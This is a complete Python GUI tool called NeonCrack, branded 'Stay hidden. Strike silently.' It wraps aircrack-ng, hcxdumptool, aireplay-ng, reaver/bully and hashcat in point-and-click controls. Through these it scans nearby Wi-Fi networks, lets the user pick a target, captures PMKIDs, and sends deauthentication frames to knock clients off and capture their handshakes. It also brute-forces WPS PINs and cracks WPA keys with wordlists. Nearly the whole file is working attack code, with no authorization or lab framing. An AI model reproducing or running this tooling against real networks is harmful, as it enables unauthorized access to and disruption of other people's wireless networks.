#!/usr/bin/env python3
"""
NeonCrack v2.4-r2 – live attack logs & picker fix
Created by Null_Lyfe — “Stay hidden.  Strike silently.”
deps: aircrack-ng hcxdumptool hcxtools hashcat reaver bully wash hashid
"""
import os, subprocess, threading, csv, time, signal, shutil, sys
from datetime import datetime
from collections import Counter
from tkinter import *
from tkinter import ttk, filedialog, scrolledtext, messagebox

# ── palette / paths ───────────────────────────────────────────────────────────
ACCENT, NEON, BGC = "#ff0080", "#00f0ff", "#0f0f23"
FONT = ("Courier New", 11)
CAP_DIR = "neoncrack_captures"
os.makedirs(CAP_DIR, exist_ok=True)

root = Tk(); root.title("NeonCrack v2.4-r2"); root.configure(bg=BGC); root.geometry("1080x780")

iface_var, target_var = StringVar(), StringVar()
scan_time            = IntVar(value=45)
pcap_var, word_var   = StringVar(), StringVar()
hash_input           = StringVar()

attack_proc  = None      # active subprocess
monitor_flag = False     # interface in monitor-mode?
networks     = []        # scan results

# ── helper utils ──────────────────────────────────────────────────────────────
def run(cmd, outfile=None):
    """silent Popen (for quick tasks)"""
    f = open(outfile, "wb") if outfile else subprocess.DEVNULL
    return subprocess.Popen(cmd, stdout=f, stderr=subprocess.STDOUT,
                            preexec_fn=os.setsid)

def run_logged(cmd, widget, outfile=None):
    """
    Launch cmd and stream its live output into <widget>.
    Also tee to outfile if provided.
    """
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            text=True, bufsize=1, universal_newlines=True,
                            preexec_fn=os.setsid)
    def _pump():
        with open(outfile, "a") if outfile else open(os.devnull, "w") as f:
            for line in proc.stdout:
                widget.insert(END, line)
                widget.see(END)
                f.write(line)
    threading.Thread(target=_pump, daemon=True).start()
    return proc

def log(w, txt): w.insert(END, txt + "\n"); w.see(END); w.update()

def iw_interfaces():
    try:
        o = subprocess.check_output(["iw", "dev"], text=True)
        return [l.split()[1] for l in o.splitlines() if l.strip().startswith("Interface")]
    except subprocess.CalledProcessError:
        return []

def set_monitor(iface, enable=True):
    global monitor_flag
    if not iface: return
    subprocess.run(["airmon-ng", "start" if enable else "stop", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    iface_var.set(iface + "mon" if enable and not iface.endswith("mon")
                  else iface.replace("mon", ""))
    monitor_flag = enable
    refresh_iface_menu()

def refresh_iface_menu():
    if 'iface_menu' not in globals(): return
    m = iface_menu["menu"]; m.delete(0, "end")
    for i in iw_interfaces():
        m.add_command(label=i, command=lambda v=i: iface_var.set(v))

# ── scan helpers ──────────────────────────────────────────────────────────────
def parse_csv(p):
    lst=[]
    with open(p,newline='') as f:
        for r in csv.reader(f):
            if len(r)>13 and r[0] and r[0]!="BSSID":
                bssid=r[0].strip().upper(); ch=r[3].strip()
                enc=r[5].strip(); essid=r[13].strip() or "<hidden>"
                lst.append((bssid,ch,essid,enc))
    return lst

def detect_wps(mon,dur=15):
    try:
        o=subprocess.check_output(["timeout",str(dur),"wash","-i",mon,"-s","-g"],
                                   text=True,stderr=subprocess.DEVNULL)
        return {l[:17].strip().upper() for l in o.splitlines() if ':' in l}
    except subprocess.CalledProcessError: return set()

# ── scanning engine ───────────────────────────────────────────────────────────
def do_scan(channel_hop=False):
    iface=iface_var.get()
    if not iface:
        messagebox.showwarning("Interface","Select interface"); return
    set_monitor(iface,True); mon=iface_var.get()
    fname=os.path.join(CAP_DIR,f"scan_{'hop' if channel_hop else 'dwell'}_{datetime.now():%Y%m%d_%H%M%S}")
    cmd=["airodump-ng","-w",fname,"--output-format","csv"]
    if not channel_hop: cmd += ["-c","1,6,11"]
    cmd.append(mon)
    proc=run_logged(cmd, scan_out)
    log(scan_out, f"[*] {'Channel-Hop' if channel_hop else 'Focused'} scan {scan_time.get()} s …")
    time.sleep(scan_time.get()); proc.terminate(); time.sleep(2)
    csvp=fname+"-01.csv"
    if not os.path.isfile(csvp):
        log(scan_out,"[!] CSV not generated"); set_monitor(mon,False); return
    base=parse_csv(csvp); wps=detect_wps(mon)
    global networks; networks=[]
    scan_out.insert(END,"# |      BSSID       | CH | ENC | WPS | ESSID\n")
    scan_out.insert(END,"-"*72+"\n")
    for idx,(bssid,ch,essid,enc) in enumerate(base,1):
        flag="Y" if bssid in wps else "-"
        networks.append((bssid,ch,essid,enc,flag))
        scan_out.insert(END,f"{idx:2}| {bssid} |{ch:>3}|{enc:^5}|  {flag} | {essid}\n")
    # build target dropdown with SSID + 1-based label
    target_menu["menu"].delete(0,"end")
    for idx,(_,_,essid,_,_) in enumerate(networks,1):
        label=f"{idx} – {essid}"
        target_menu["menu"].add_command(label=label,
            command=lambda v=str(idx): target_var.set(v))
    log(scan_out,f"[+] {len(networks)} networks captured.")
    set_monitor(mon,False)

# ── handshake monitor (auto-stop) ─────────────────────────────────────────────
def handshake_monitor(cap,bssid):
    global attack_proc
    while attack_proc and attack_proc.poll() is None:
        try:
            out=subprocess.check_output(
                ["aircrack-ng","-a","2","-w","/dev/null","-b",bssid,cap],
                text=True,stderr=subprocess.DEVNULL,timeout=20)
            if "handshake" in out.lower():
                log(att_out,"[+] Handshake found – stopping capture.")
                os.killpg(os.getpgid(attack_proc.pid), signal.SIGTERM)
                attack_proc=None; set_monitor(iface_var.get(),False); return
        except subprocess.TimeoutExpired:
            pass
        time.sleep(15)

# ── attack helpers ───────────────────────────────────────────────────────────
def pick_target():
    sel=target_var.get()
    if not sel:
        messagebox.showinfo("Target","Select a network first."); return None
    return networks[int(sel)-1]   # 1-based → 0-based

# ── attacks ───────────────────────────────────────────────────────────────────
def start_pmkid():
    t=pick_target(); iface=iface_var.get()
    if not t: return
    bssid,ch,essid,_,_=t
    set_monitor(iface,True); mon=iface_var.get()
    pcap=os.path.join(CAP_DIR,f"pmkid_{essid}_{int(time.time())}.pcapng")
    global attack_proc
    attack_proc = run_logged(
        ["hcxdumptool","-i",mon,"--filterlist_ap",bssid,"--enable_status=1"],
        att_out, pcap)
    log(att_out,f"[*] PMKID capture → {pcap}")

def start_handshake():
    t=pick_target(); iface=iface_var.get()
    if not t: return
    bssid,ch,essid,_,_=t
    set_monitor(iface,True); mon=iface_var.get()
    prefix=os.path.join(CAP_DIR,f"hs_{essid}_{int(time.time())}")
    global attack_proc
    attack_proc = run_logged(
        ["airodump-ng","-c",ch,"--bssid",bssid,"-w",prefix,mon],
        att_out, prefix+".log")
    run(["aireplay-ng","-0","10","-a",bssid,mon]).wait()
    threading.Thread(target=handshake_monitor,
                     args=(prefix+"-01.cap",bssid),daemon=True).start()

def start_wps():
    t=pick_target(); iface=iface_var.get()
    if not t: return
    bssid,ch,essid,_,_=t
    set_monitor(iface,True); mon=iface_var.get()
    tool="reaver" if shutil.which("reaver") else "bully"
    cmd=["reaver","-i",mon,"-b",bssid,"-c",ch,"-vv"] if tool=="reaver" \
        else ["bully","-b",bssid,"-c",ch,mon]
    logfile=os.path.join(CAP_DIR,f"wps_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd, att_out, logfile)
    log(att_out,f"[*] {tool} WPS attack started – log → {logfile}")

def stop_attack():
    global attack_proc
    if attack_proc:
        os.killpg(os.getpgid(attack_proc.pid), signal.SIGTERM)
        attack_proc=None
    if monitor_flag: set_monitor(iface_var.get(),False)
    log(att_out,"[!] Attack stopped.")

# ── cracking & utilities (unchanged) ──────────────────────────────────────────
def browse_pcap(): pcap_var.set(filedialog.askopenfilename(
    filetypes=[("Capture","*.cap *.pcap *.pcapng *.hccapx")]))

def browse_word(): word_var.set(filedialog.askopenfilename(
    filetypes=[("Wordlist","*.txt *.lst")]))

def crack():
    cap,wl=pcap_var.get(),word_var.get()
    if not (cap and wl):
        messagebox.showwarning("Missing","Select capture & wordlist"); return
    if cap.endswith((".pcap",".pcapng",".cap")):
        conv=os.path.join(CAP_DIR,f"conv_{int(time.time())}.hccapx")
        run(["hcxpcapngtool","-o",conv,cap]).wait(); cap=conv
    run_logged(["hashcat","-m","22000",cap,wl,"--force"], crack_out)
    crack_out.insert(END,"[*] Hashcat started …\n")

def identify_hash(h):
    if shutil.which("hashid"):
        try:return subprocess.check_output(["hashid","-m",h],text=True,
                                           stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError: pass
    return {32:"Likely MD5",40:"Likely SHA-1",64:"Likely SHA-256"}.get(len(h),"Unknown")

def hashid_action():
    h=hash_input.get().strip()
    if not h:return
    hashid_out.delete("1.0",END); hashid_out.insert(END,identify_hash(h)+"\n")

def clean_capture():
    cap=filedialog.askopenfilename(filetypes=[("pcapng","*.pcapng")])
    if not cap:return
    out=cap.replace(".pcapng","_cleaned.pcapng")
    run(["hcxpcapngtool","--cleanall","-o",out,cap]).wait()
    cleaner_out.insert(END,f"[+] Cleaned → {out}\n")

def show_stats():
    pot=os.path.expanduser("~/.hashcat/hashcat.potfile")
    if not os.path.isfile(pot):
        stats_out.delete("1.0",END); stats_out.insert(END,"No potfile.\n"); return
    dist=Counter(len(l.split(':',1)[1].strip()) for l in open(pot) if ':' in l)
    stats_out.delete("1.0",END); stats_out.insert(END,"Len | Count\n--------------\n")
    for l,c in sorted(dist.items()): stats_out.insert(END,f"{l:>3} | {c}\n")

# ── GUI layout ────────────────────────────────────────────────────────────────
style=ttk.Style(); style.theme_use("alt")
style.configure("TNotebook.Tab", background="#1a1a1a", foreground=NEON,
                padding=8, font=FONT)

nb=ttk.Notebook(root); nb.pack(fill=BOTH,expand=True)
tabs={}
for key,label in [("scan","⚡ Scan"),("attack","⚔️ Attacks"),("crack","💥 Crack"),
                  ("hash","🔎 Hash ID"),("clean","🧹 Cleaner"),("stats","📊 Stats")]:
    f=Frame(nb,bg=BGC); nb.add(f,text=label); tabs[key]=f

#  Scan tab
ts=tabs["scan"]
iface_menu=OptionMenu(ts, iface_var, *iw_interfaces()); iface_menu.pack(pady=4)
refresh_iface_menu()
Button(ts,text="Enable Monitor",bg=ACCENT,fg="white",
       command=lambda:set_monitor(iface_var.get(),True)).pack(pady=2)
Button(ts,text="Disable Monitor",bg="#ff0030",fg="white",
       command=lambda:set_monitor(iface_var.get(),False)).pack(pady=2)
Spinbox(ts,from_=15,to=180,textvariable=scan_time,width=5).pack()
Button(ts,text="Focused Scan",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=do_scan,daemon=True).start()).pack(pady=2)
Button(ts,text="Channel-Hop Scan",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=do_scan,
                                       kwargs={'channel_hop':True},
                                       daemon=True).start()).pack(pady=2)
scan_out=scrolledtext.ScrolledText(ts,width=115,height=24,
                                   bg="#0d0d17",fg=NEON,font=("Consolas",10))
scan_out.pack()

#  Attack tab
ta=tabs["attack"]
target_menu=OptionMenu(ta,target_var,""); target_menu.pack(fill=X,padx=10,pady=4)
for txt,fn in [("PMKID Capture",start_pmkid),
               ("4-Way Handshake",start_handshake),
               ("WPS Bruteforce",start_wps)]:
    Button(ta,text=txt,bg=ACCENT,fg="white",command=fn).pack(fill=X,padx=20,pady=2)
Button(ta,text="Stop Attack",bg="#ff0030",fg="white",command=stop_attack).pack(fill=X,padx=20,pady=4)
att_out=scrolledtext.ScrolledText(ta,width=115,height=18,
                                  bg="#0d0d17",fg=NEON,font=("Consolas",10))
att_out.pack()

#  Crack tab
tc=tabs["crack"]
Entry(tc,textvariable=pcap_var,width=85).pack(pady=2)
Button(tc,text="Browse pcap",command=browse_pcap).pack()
Entry(tc,textvariable=word_var,width=85).pack(pady=2)
Button(tc,text="Browse wordlist",command=browse_word).pack()
Button(tc,text="Start Crack",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=crack,daemon=True).start()).pack(pady=4)
crack_out=scrolledtext.ScrolledText(tc,width=115,height=18,
                                    bg="#0d0d17",fg=NEON,font=("Consolas",10))
crack_out.pack()

#  Hash-ID tab
th=tabs["hash"]
Entry(th,textvariable=hash_input,width=85).pack(pady=4)
Button(th,text="Identify Hash",command=hashid_action,
       bg=ACCENT,fg="white").pack()
hashid_out=scrolledtext.ScrolledText(th,width=115,height=18,
                                     bg="#0d0d17",fg=NEON,font=("Consolas",10))
hashid_out.pack()

#  Cleaner
cl=tabs["clean"]
Button(cl,text="Select & Clean pcapng",command=clean_capture,
       bg=ACCENT,fg="white").pack(pady=4)
cleaner_out=scrolledtext.ScrolledText(cl,width=115,height=20,
                                      bg="#0d0d17",fg=NEON,font=("Consolas",10))
cleaner_out.pack()

#  Stats
st=tabs["stats"]
Button(st,text="Refresh Stats",command=show_stats,
       bg=ACCENT,fg="white").pack(pady=4)
stats_out=scrolledtext.ScrolledText(st,width=115,height=20,
                                    bg="#0d0d17",fg=NEON,font=("Consolas",10))
stats_out.pack()

# ── launch ────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if os.geteuid()!=0:
        messagebox.showerror("Need root","Run NeonCrack with sudo."); sys.exit(1)
    root.mainloop()